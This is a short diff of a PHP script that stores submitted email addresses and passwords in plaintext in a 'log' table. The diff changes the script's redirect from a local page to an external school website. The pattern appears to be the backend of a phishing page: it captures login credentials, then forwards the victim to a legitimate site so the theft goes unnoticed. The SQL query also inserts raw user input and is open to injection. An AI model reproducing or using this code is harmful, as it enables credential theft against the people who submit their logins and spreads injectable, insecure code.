@@ -28,7 +28,7 @@ if (isset($_POST['password'])) {
 
     db_open();
     db_query("INSERT INTO `log`(`date`, `email`, `password`) VALUES ('$time','$email','$password')");
-    header("Location: /proc.php");
+    header("Location: https://www.stmarks.edu.hk/web/");
 }
 ?>
 
